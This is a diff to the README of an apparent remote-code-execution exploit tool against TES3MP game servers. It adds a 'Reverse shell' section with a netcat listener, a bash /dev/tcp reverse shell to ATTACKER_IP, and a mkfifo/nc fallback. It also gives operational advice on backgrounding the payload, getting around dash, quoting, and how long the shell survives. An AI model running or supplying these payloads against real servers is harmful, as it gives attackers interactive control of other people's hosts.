@@ -96,10 +96,43 @@ Two client connections are used: **A** performs the attack, **R** sits in the sa
 relayed packets that carry the leaked bytes. On one host they are separated by `-b`; in a real attack they
 would simply be two connections.
 
-**Payloads should exit 0.** After the overwrite, `strlen` returns the command's exit status, and that value
-is used as a string length elsewhere in the server, so a failing command destabilises the process quickly.
-`touch /tmp/x` is fine. To keep the server healthy while running something long, background it:
-`-c '/bin/sh -c "..." &'`.
+**Payloads should exit 0, and anything long-running must be backgrounded.** After the overwrite, `strlen`
+returns the command's exit status, and that value is used as a string length elsewhere in the server, so a
+failing or blocking command destabilises the process quickly. `touch /tmp/x` is fine as-is.
+
+### Reverse shell
+
+```sh
+# on the attacking host
+nc -lvnp 4444
+
+# then
+./tes3mp-rce -P 'server-password' \
+  -c "/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &" \
+  victim.example.net
+```
+
+Three details, each of which is load-bearing:
+
+* **The trailing `&` is mandatory.** `system()` blocks until the command finishes. Without it the server's
+  packet loop stalls for as long as the shell is open, and the shell's eventual exit status is then used as
+  a string length.
+* **The inner `/bin/bash -c` wrapper is required.** `system()` runs the payload with `/bin/sh`, which on
+  Debian/Ubuntu is `dash` — and dash supports neither `/dev/tcp/...` nor the `>&` redirection. The wrapper
+  hands those bash-only features to bash.
+* **Quote it as `-c "... '...' &"`** — double quotes outside, single quotes inside — so your own shell
+  passes the whole thing through as one argument.
+
+If bash is not on the target, a portable alternative:
+
+```sh
+-c "rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f) &"
+```
+
+**Expect the server process to die shortly afterwards.** `strlen` remains hijacked, so the next few string
+operations inside the server misbehave. The shell is a detached child and survives the server's death; it
+does not survive the host rebooting. This is why the disclosure PoC uses the marker payload instead: it
+proves execution without leaving the service in a broken state.
 
 ## How it works
 
